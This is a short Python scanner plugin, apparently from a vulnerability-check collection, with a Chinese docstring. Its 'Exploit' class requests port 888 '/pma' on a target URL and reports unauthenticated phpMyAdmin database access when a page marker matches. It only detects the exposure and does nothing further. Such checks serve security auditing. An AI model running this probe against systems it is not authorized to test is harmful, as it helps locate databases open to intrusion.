"""
:888/pma未授权
"""
import requests


class Exploit(object):

    def attack(self, url):
        target = url + ":888/pma"
        r = requests.get(target)

        if 'index.php?db=&table=&server=1&target=&lang=' in r.text:
            return "{} 存在未授权访问数据库".format(target)
